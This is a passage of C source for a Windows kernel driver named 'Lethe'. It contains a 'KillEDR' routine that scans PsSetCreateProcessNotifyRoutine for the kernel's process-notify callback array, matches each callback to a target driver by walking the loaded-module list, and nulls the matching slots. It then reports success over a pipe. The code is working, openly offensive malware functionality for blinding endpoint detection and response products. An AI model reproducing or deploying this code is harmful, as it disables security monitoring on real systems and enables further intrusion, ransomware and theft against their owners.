        DbgPrint("[Lethe] PsSetCreateProcessNotifyRoutine"
                 " not found\n");
        return NULL;
    }

    DbgPrint("[Lethe] PsSetCreateProcessNotifyRoutine: %p\n",
             funcAddr);

    __try {
        for (ULONG i = 0; i < 512; i++) {

            if (!MmIsAddressValid(funcAddr + i + 10)) break;

            BOOLEAN isLea =
                ((funcAddr[i]   == 0x48 || funcAddr[i]   == 0x4C) &&
                  funcAddr[i+1] == 0x8D &&
                  funcAddr[i+2] == 0x0D);

            if (!isLea) continue;

            LONG  disp  = *(PLONG)(funcAddr + i + 3);
            PVOID array = (PVOID)(funcAddr + i + 7 + disp);

            if ((PUCHAR)array < (PUCHAR)NtBase ||
                (PUCHAR)array > (PUCHAR)NtBase + NtSize) {
                DbgPrint("[Lethe] LEA at offset %d → %p"
                         " outside ntoskrnl, skipping\n",
                         i, array);
                continue;
            }

            // Must be valid memory
            if (!MmIsAddressValid(array)) continue;

            DbgPrint("[Lethe] Callback array: %p"
                     " (offset %d)\n", array, i);
            return array;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DbgPrint("[Lethe] KillEDR: scan exception\n");
    }

    DbgPrint("[Lethe] KillEDR: callback array not found\n");
    return NULL;
}

BOOLEAN LetheCallbackBelongsToTarget(PVOID CallbackAddress, PUNICODE_STRING TargetName) {
    if (!CallbackAddress || !TargetName) return FALSE;
    if (TargetName->Length == 0) return FALSE;

    PVOID moduleBase = NULL;
    PVOID result = RtlPcToFileHeader(CallbackAddress, &moduleBase);

    if (!result || !moduleBase) return FALSE;

    UNICODE_STRING psLoaded;
    RtlInitUnicodeString(&psLoaded, L"PsLoadedModuleList");

    PLIST_ENTRY moduleList =
        (PLIST_ENTRY)MmGetSystemRoutineAddress(&psLoaded);
    if (!moduleList) return FALSE;

    __try {
        PLIST_ENTRY entry = moduleList->Flink;

        while (entry && entry != moduleList) {
            if (!MmIsAddressValid(entry)) break;

            PLDR_DATA_TABLE_ENTRY mod =
                CONTAINING_RECORD(entry,
                                  LDR_DATA_TABLE_ENTRY,
                                  InLoadOrderLinks);

            if (mod->DllBase == moduleBase) {
                if (mod->BaseDllName.Buffer &&
                    mod->BaseDllName.Length > 0) {
                    return LetheUnicodeContains(
                        &mod->BaseDllName, TargetName);
                }
                return FALSE;
            }

            entry = entry->Flink;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DbgPrint("[Lethe] KillEDR: exception in module walk\n");
    }

    return FALSE;
}

//Main KillEDR function
NTSTATUS LetheKillEDR(HANDLE PipeHandle, PWCHAR TargetName) {

    DbgPrint("[Lethe] KillEDR: targeting %ws\n", TargetName);

    PVOID ntBase = LetheGetNtoskrnlBase();
    if (!ntBase) {
        LetheSendResult(PipeHandle, "Error: ntBase null");
        return STATUS_UNSUCCESSFUL;
    }

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)
        ((PUCHAR)ntBase +
         ((PIMAGE_DOS_HEADER)ntBase)->e_lfanew);
    SIZE_T ntSize = nt->OptionalHeader.SizeOfImage;

    PVOID callbackArray = LetheFindCallbackArray(ntBase, ntSize);
    if (!callbackArray) {
        LetheSendResult(PipeHandle, "Error: callback array not found");
        return STATUS_NOT_FOUND;
    }

    // Build UNICODE_STRING from the target name
    UNICODE_STRING targetUstr;
    RtlInitUnicodeString(&targetUstr, TargetName);

    ULONG removed = 0;

    __try {
        for (ULONG i = 0; i < 64; i++) {

            // Each slot is a ULONG_PTR (EX_FAST_REF)
            PULONG_PTR slot =
                (PULONG_PTR)callbackArray + i;

            if (!MmIsAddressValid(slot)) continue;

            ULONG_PTR val = *slot;
            if (!val) continue;

            PVOID block = (PVOID)(val & ~0xFULL);
            if (!block) continue;

            if (!MmIsAddressValid(block)) continue;
            if ((ULONG_PTR)block < 0xFFFF000000000000ULL)
                continue;

            PVOID* funcSlot = (PVOID*)((PUCHAR)block + 0x08);

            if (!MmIsAddressValid(funcSlot)) continue;

            PVOID func = *funcSlot;
            if (!func) continue;

            if (LetheCallbackBelongsToTarget( func, &targetUstr)) {

                DbgPrint("[Lethe] Nulling callback[%d]: %p\n", i, func);

                *slot = 0;
                removed++;
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DbgPrint("[Lethe] KillEDR: exception in array walk\n");
        LetheSendResult(PipeHandle, "Error: exception during callback walk");
        return STATUS_UNSUCCESSFUL;
    }

    if (removed == 0) {
        DbgPrint("[Lethe] KillEDR: no callbacks found\n");
        LetheSendResult(PipeHandle, "KillEDR: not supported in this build");
        return STATUS_NOT_FOUND;
    }

    char result[128] = { 0 };
    RtlStringCbPrintfA(result, sizeof(result), "KillEDR OK: %d callbacks removed", removed);
    LetheSendResult(PipeHandle, result);

    return STATUS_SUCCESS;
}